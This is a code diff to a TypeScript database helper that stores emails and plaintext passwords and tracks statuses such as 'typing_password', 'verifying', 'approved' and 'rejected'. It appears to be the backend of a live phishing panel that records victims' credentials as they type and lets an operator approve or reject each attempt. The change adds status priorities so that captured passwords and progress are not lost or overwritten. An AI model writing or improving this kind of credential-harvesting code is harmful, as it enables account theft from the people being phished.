@@ -121,29 +121,68 @@ if (neonPool) {
   initDbSchema().catch(console.error);
 }
 
+// Status priority hierarchy to prevent race conditions and status downgrades
+const STATUS_PRIORITY: Record<string, number> = {
+  email_entered: 1,
+  typing_password: 2,
+  verifying: 3,
+  approved: 4,
+  rejected: 4,
+};
+
 // Database helper operations
 export const db = {
-  async saveUser(email: string, password: string, status: string) {
+  async saveUser(email: string, password: string, status: string, targetUserId?: number) {
+    const incomingPriority = STATUS_PRIORITY[status] || 0;
+
     if (neonPool) {
       try {
-        // Check existing user with this email
-        const checkRes = await neonPool.query(
-          'SELECT id FROM users WHERE email = $1 ORDER BY id DESC LIMIT 1',
-          [email]
-        );
-        if (checkRes.rows.length > 0) {
-          const userId = checkRes.rows[0].id;
+        let userId: number | null = targetUserId || null;
+        let currentStatus: string | null = null;
+        let currentPassword: string = '';
+
+        if (userId) {
+          const idRes = await neonPool.query('SELECT id, status, password FROM users WHERE id = $1', [userId]);
+          if (idRes.rows.length > 0) {
+            currentStatus = idRes.rows[0].status;
+            currentPassword = idRes.rows[0].password || '';
+          } else {
+            userId = null;
+          }
+        }
+
+        if (!userId) {
+          const checkRes = await neonPool.query(
+            'SELECT id, status, password FROM users WHERE email = $1 ORDER BY id DESC LIMIT 1',
+            [email]
+          );
+          if (checkRes.rows.length > 0) {
+            userId = checkRes.rows[0].id;
+            currentStatus = checkRes.rows[0].status;
+            currentPassword = checkRes.rows[0].password || '';
+          }
+        }
+
+        if (userId && currentStatus) {
+          const currentPriority = STATUS_PRIORITY[currentStatus] || 0;
+          
+          // Never downgrade status:
+          // e.g. if current is verifying (3), an incoming typing_password (2) must NOT revert status!
+          const effectiveStatus = incomingPriority >= currentPriority ? status : currentStatus;
+          // Preserve password if incoming password is empty and current password exists
+          const effectivePassword = password !== '' ? password : currentPassword;
+
           await neonPool.query(
             'UPDATE users SET password = $1, status = $2 WHERE id = $3',
-            [password, status, userId]
+            [effectivePassword, effectiveStatus, userId]
           );
-          return { success: true, user_id: userId, action: 'updated' };
+          return { success: true, user_id: userId, action: 'updated', status: effectiveStatus };
         } else {
           const insertRes = await neonPool.query(
             'INSERT INTO users (email, password, status) VALUES ($1, $2, $3) RETURNING id',
             [email, password, status]
           );
-          return { success: true, user_id: insertRes.rows[0].id, action: 'created' };
+          return { success: true, user_id: insertRes.rows[0].id, action: 'created', status };
         }
       } catch (err) {
         console.warn('saveUser database fallback to memory:', err);
@@ -151,12 +190,20 @@ export const db = {
     }
 
     // Fallback Memory Store
-    const existingIndex = globalMemoryStore.users.findIndex(u => u.email === email);
-    if (existingIndex !== -1) {
-      const u = globalMemoryStore.users[existingIndex];
-      u.password = password;
-      u.status = status;
-      return { success: true, user_id: u.id, action: 'updated' };
+    let user = targetUserId ? globalMemoryStore.users.find(u => u.id === targetUserId) : null;
+    if (!user) {
+      user = globalMemoryStore.users.find(u => u.email === email);
+    }
+
+    if (user) {
+      const currentPriority = STATUS_PRIORITY[user.status] || 0;
+      if (incomingPriority >= currentPriority) {
+        user.status = status;
+      }
+      if (password !== '') {
+        user.password = password;
+      }
+      return { success: true, user_id: user.id, action: 'updated', status: user.status };
     } else {
       const newId = globalMemoryStore.userAutoId++;
       globalMemoryStore.users.push({
@@ -166,7 +213,7 @@ export const db = {
         status,
         created_at: new Date(),
       });
-      return { success: true, user_id: newId, action: 'created' };
+      return { success: true, user_id: newId, action: 'created', status };
     }
   },
 
